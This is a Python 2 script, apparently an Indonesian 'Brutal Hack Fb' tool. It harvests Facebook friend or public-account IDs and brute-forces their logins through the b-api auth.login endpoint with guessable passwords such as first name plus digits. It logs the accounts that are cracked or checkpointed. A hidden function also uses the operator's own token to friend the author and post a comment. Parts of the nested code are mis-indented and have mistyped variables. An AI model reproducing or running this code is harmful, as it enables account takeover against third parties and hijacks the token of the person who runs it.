#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    os.system('python2 lovehacker.py')

from requests.exceptions import ConnectionError
from mechanize import Browser

#### browser ####
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

#### colours #####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'
W='\033[0;37m'

#### exit ####
def exb():
	print (R + 'Exit')
	os.sys.exit()

#### clear ####
def komen():
    try:
        toke=open('token.txt', 'r').read()
    except IOError:
        print '[!] Token invalid'
        os.system('rm -rf token.txt')
	una='100037409814353'
        kom='SC Lo Paling Keren Bang Adee Gans\xf0\x9f\x98\x98'
        reac='LOVE'
        post='252790762644582'
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toke)
	requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
	requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toke)

###$$$#########
def cb():
    os.system('clear')

#### time sleep ####
def t():
    time.sleep(1)
def t1():
    time.sleep(0.01)

#### print std ####
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		t1()

#### token remove ####
def trb():
    os.system('rm -rf token.txt')

##### LOGO #####
logo = """
\033[1;91m┌─────────────────────────────────────────────────────────────┐\033[1;91m
│   ▄▄▄▄▄▄                      █                    █        │\033[1;91m
│   █       ▄▄▄    ▄▄▄    ▄▄▄   █▄▄▄    ▄▄▄    ▄▄▄   █   ▄    │\033[1;91m
│   █▄▄▄▄▄ ▀   █  █▀  ▀  █▀  █  █▀ ▀█  █▀ ▀█  █▀ ▀█  █ ▄▀     │\033[1;91m
│   █      ▄▀▀▀█  █      █▀▀▀▀  █   █  █   █  █   █  █▀█      │\033[1;91m
│   █      ▀▄▄▀█  ▀█▄▄▀  ▀█▄▄▀  ██▄█▀  ▀█▄█▀  ▀█▄█▀  █  ▀▄    │\033[1;91m
│┏━┓┏┓╻┏━┓┏┓╻╻ ╻┏━┓┏━┓╻ ╻╻┏┓╻╻ ╻  Catatan                     │\033[1;91m
│┣━┫┃┗┫┃ ┃┃┗┫┗┳┛┗━┓┣━┛┣━┫┃┃┗┫┏╋┛     :Kalo Mau Make Gak       │\033[1;91m
│╹ ╹╹ ╹┗━┛╹ ╹ ╹ ┗━┛╹  ╹ ╹╹╹ ╹╹ ╹      usah Recoding Bangsat   │\033[1;91m
└─────────────────────────────────────────────────────────────┘\033[1;91m
\033[1;97m╔═════════════════════════════════════════════════════════════╗
\033[1;97m║\033[1;93m* \033[1;97mTeam    \033[1;91m: \033[1;96mAnonySphinx Kosambi \033[1;97m                             |
\033[1;97m║\033[1;93m* \033[1;97mGithub  \033[1;91m: \033[1;96mhttps://github.com/AdeMara01/crack\033[1;97m               ║
\033[1;97m║\033[1;93m* \033[1;97mFB      \033[1;91m: \033[1;92m\033[4mhttps://web.facebook.com/ademara.ademara\033[0m\033[1;97m         ║
\033[1;97m║\033[1;93m* \033[1;97mCredits \033[1;91m: \033[1;96m[Wrath] [Magizz] [GondrongCyber] \033[1;97m                ║
\033[1;97m║\033[1;93m* \033[1;97mNotice \033[1;91m : \033[1;96mThis is not my own work, i just recoded it. \033[1;97m     ║
\033[1;97m║\033[1;93m* \033[1;97mVersion \033[1;91m: \033[1;92m\033[4m1.1.0\033[0m                        \033[1;97m                    ║
\033[1;97m╚═════════════════════════════════════════════════════════════╝"""

# load #
def load():
        tiload = ['.   ','..  ','... ']
        for o in tiload:
                print("\r\033[1;91m[●] \033[1;92mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
######
back=0
successfull=[]
checkpoint=[]
oks=[]
cps=[]
id=[]

#### login ####
def login():
	cb()
	try:
		tb=open('token.txt', 'r')
		menu() 
	except (KeyError,IOError):
		cb()
		print ("Token Udah Mati Harap Masukan Token Lagi!")
		time.sleep(3)
		os.system("python2 .09091.py")
def menu():
	cb()
	try:
		tb=open('token.txt','r').read()
	except IOError:
		print (R + 'Token Invalid !')
		trb()
		t()
		login()
	try:
		otw=requests.get('https://graph.facebook.com/me?access_token='+tb)
		a=json.loads(otw.text)
	except KeyError:
		print (G + 'Account has a checkpoint !')
		trb()
		t()
		login()
	except requests.exceptions.ConnectionError:
		print (W + 'No internet connection !')
		t()
		exb()
	cb()
	print (logo)
	print (S + '[☆] ' + G + 'ID Name: ' + R + a['name'])
	print (S + '[☆] ' + G + 'User ID: ' + R + a['id'])
	print
	print (S + 50*'-')
	print
	print (S + '[' + P + '☞1' + S + ']' + S + ' Brutal Hack Fb')
	print (S + '[' + P + '☞2' + S + ']' + S + ' Tools PrankSms')
	print (S + '[' + P + '☞3' + S + ']' + S + ' Ade Mara')
	print (S + '[' + P + '☞4' + S + ']' + S + ' Log Out')
	print (S + '[' + Y + '☞0' + S + ']' + R + ' Keluar')
	print
	print (S + 50*'-')
	print
	mb()


def mb():
	bm=raw_input(W + ' ✬🄵🄰🄲🄴🄱🄾🄾🄺✬   ')
	if bm =='':
		print (R + 'Select a valid option !')
		mb()
	elif bm =='1':
		pak()
	elif bm =='2':
	    os.system('python2 .sms')
	    cb()
	elif bm =='3':
	    os.system('xdg-open https://www.youtube.com/channel/UCm44L0CGNh74uc3uti_L3BQ')
	    menu()
	elif bm =='4':
		psb('Token Has Been Removed')
		trb()
		t()
		exb()
	elif bm =='0':
	    exb()
	else:
		print (R+'Fill in correctly !')
		mb()

def pak():
	global tb
	try:
		tb=open('token.txt','r').read()
	except IOError:
		print (R + ' Invalid Token !')
		trb()
		t()
		login()
	cb()
	print (logo)
	print (S + '[' + P + '☞1' + S + ']' + P + ' Clone With Friend List')
	print (S + '[' + P + '☞2' + S + ']' + P + ' Clone From Public Account')
	print (S + '[' + Y + '☞3' + S + ']' + Y + ' Clone From File')
	print (S + '[' + Y + '☞4' + S + ']' + Y + ' Crack Username')
	print (S + '[' + R + '☞0' + S + ']' + R + ' Back')
	print
	print (S + 50*'-')
	print
	pb()

def pb():
	bp=raw_input(W + ' ✬🄵🄰🄲🄴🄱🄾🄾🄺✬   ')
	if bp =='':
		print (R + 'Select a valid option !')
		pb()
	elif bp =='1':
	        komen()
		cb()
		print (logo)
		r=requests.get('https://graph.facebook.com/me/friends?access_token='+tb)
		z=json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif bp=='2':
		cb()
		print (logo)
		idt=raw_input(S + '[☆] ' + G + 'Put Public User ID/User Name: ' + W + '')
		cb()
		print (logo)
		try:
			jok=requests.get('https://graph.facebook.com/'+idt+'?access_token='+tb)
			op=json.loads(jok.text)
			psb(S + '[☆]' + G + ' Account  Name: ' + W + op['name'])
		except KeyError:
			print (R + ' ID not found !')
			raw_input(R + ' Back')
			pak()
		r=requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+tb)
		z=json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif bp =='3':
		cb()
		print (logo)
		try:
			idlist=raw_input(S + '[☆] ' + R + 'Enter File Path: ' + G + '')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print (R + ' File Not Fount !')
			raw_input(R + ' Back')
			pak()
	elif bp == '4':
		cb()
		os.system('python2 .id.py')
		pak()
	elif bp =='0':
		menu()
	else:
		print (R + ' Select a valid option !')
		pb()
	print (S + '[☆]' + P + ' Total Teman: ' + W + str(len(id)))
	psb(S + '[☆]' + S + ' Untuk Berhenti Klik  CTRL ~ Z')
	print
	print (S + 50*'-')
	print
	def main(arg):
		global cps, oks
		user=arg
		try:
			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
			j=json.loads(h.text)
			ps1=('Kontol')
			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			k=json.load(dt)
			if 'www.facebook.com' in k['error_msg']:
			    print(S+'[CP] ♡ '+user+' ♡ '+ps1)
			    cps.append(user+ps1)
			else:
			    if 'access_token' in k:
			        print (G+'[OK] ♡ '+user+' ♡ '+ps1)
			        oks.append(user+ps1)
			    else:
			        ps2=(j['first_name']+'123')
			        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			        k=json.load(dt)
			        if 'www.facebook.com' in k['error_msg']:
			            print(S+'[CP] ♡ '+user+' ♡ '+ps2)
			            cps.append(user+ps2)
			        else:
			            if 'access_token' in k:
			                print(G+'[OK] ♡ '+user+' ♡ '+ps2)
			                oks.append(user+ps2)
			            else:
			                ps3=(j['first_name']+'321')
			                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                k=json.load(dt)
			                if 'www.facebook.com' in k['error_msg']:
			                    print(S+'[CP] ♡ '+user+' ♡ '+ps3)
			                    cps.append(user+ps3)
			                else:
			                    if 'access_token' in k:
			                        print(G+'[OK] ♡ '+user+' ♡ '+ps3)
			                        oks.append(user+ps3)
			                    else:
			                        ps4=(j['first_name']+'12345')
			                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps4)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                        k=json.load(dt)
			                        if 'www.facebook.com' in k['error_msg']:
			                            print(S+'[CP] ♡ '+user+' ♡ '+ps4)
			                            cps.append(user+ps4)
			                        else:
			                            if 'access_token' in k:
			                                print(G+'[OK] ♡ '+user+' ♡ '+ps4)
			                                oks.append(user+ps4)
			                            else:
			                                ps5=('Sayang')
			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                                k=json.load(dt)
			                                if 'www.facebook.com' in k['error_msg']:
			                                    print(S+'[CP] ♡ '+user+' ♡ '+ps5)
			                                    cps.append(user+ps5)
			                                else:
			                                    if 'access_token' in k:
			                                        print(G+'[OK] ♡ '+user+' ♡ '+ps5)
			                                        oks.append(user+ps5)
			                                    else:
			                                        ps6=(j['first_name']+'1234')
			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                                        k=json.load(dt)
			                                        if 'www.facebook.com' in k['error_msg']:
			                                            print(S+'[CP] ♡ '+user+' ♡ '+ps6)
			                                            cps.append(user+ps6)
			                                        else:
			                                            if 'access_token' in k:
			                                                print(G+'[OK] ♡ '+user+' ♡ '+ps6)
			                                                oks.append(user+ps6)
                                                                    else:
                                                                        ps7=(J['first_name']+'54321')
                                                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps7)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
		                                                        K=json.load(dt)
                                                                        if 'www.facebook.com' in k['error_msg']:
                                                                            print(S+'[CP] ♡ '+user+' ♡ '+ps7)
                                                                            cps.append(user+ps7)
									else:
								      	     ps8=('anjing')
									     dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps8)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
									     K=json.load(dt)
                                                                             if 'www.facebook.com' in k['error_msg']:
                                                                                 print(S+'[CP] ♡ '+user+' ♡ '+ps8)
                                                                                 cps.append(user+ps8)
									     else:
										 ps9=('Bangsat')
										 dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps9)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
										 k=json.load(dt)
										 if 'www.facebook.com' in k['error_msg']:
										     print(S+'[CP] ♡ '+user+' ♡ '+ps9)
                                                                                     cps.append(user+ps9)
     							                         else:
							                              ps11=('12345678')
						               		              dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps11)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                      k=json.load(dt)
                                                                                      if 'www.facebook.com' in k['error_msg']:
                                                                                          print(S+'[CP] ♡ '+user+' ♡ '+ps11)
                                                                                          cps.append(user+ps11)
							    		              else:
										           ps12=(J['first_name']+'12345678')
										           dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps12)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
		                                                                           K=json.load(dt)
                                                                                           if 'www.facebook.com' in k['rror_msg']:
                                                                                               print(S+'[CP] ♡ '+user+' ♡ '+ps12)
                                                                                               cps.append(user+ps12)
		except:
			pass
	p=ThreadPool(30)
	p.map(main, id)
	print
	print(S+50*'-')
	print
	print(S+'Login Akun Yang Kena Cp Selama 7 Hari ')
	print(Y+'Total '+G+'OK'+S+'/'+P+'CP'+S+' = '+G+str(len(oks))+S+'/'+R+str(len(cps)))
	raw_input(S+'kembali ')
	os.system("clear")
	print ("SUKREB CHANELL YT GUA DULU:v")
	komen()
	time.sleep(0.3)
	os.system('xdg-open https://www.youtube.com/channel/UCm44L0CGNh74uc3uti_L3BQ')
	menu()
if __name__=='__main__':
    login()
